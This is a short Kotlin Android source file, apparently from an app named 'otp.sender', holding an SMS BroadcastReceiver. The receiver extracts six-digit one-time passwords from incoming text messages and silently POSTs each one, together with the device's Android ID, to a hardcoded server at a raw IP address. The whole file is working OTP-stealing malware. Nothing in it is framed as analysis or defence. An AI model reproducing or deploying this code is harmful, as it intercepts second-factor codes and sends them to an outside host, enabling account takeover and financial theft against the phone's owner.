package com.otp.sender

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.telephony.SmsMessage
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val bundle = intent.extras ?: return
        val pdus = bundle["pdus"] as Array<*>

        for (pdu in pdus) {
            val sms = SmsMessage.createFromPdu(pdu as ByteArray)
            val text = sms.messageBody

            val regex = Regex("\\b\\d{6}\\b")
            val match = regex.find(text)

            if (match != null) {
                val otp = match.value
                sendOtp(context, otp)
            }
        }
    }

    private fun sendOtp(context: Context, otp: String) {
        Thread {
            try {
                val url = URL("http://212.23.201.110:8000/receiver/")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true

                val deviceId = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ANDROID_ID
                )

                val data = "otp=$otp&device_id=$deviceId"
                conn.outputStream.write(data.toByteArray())
                conn.outputStream.close()
                conn.responseCode
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }
}
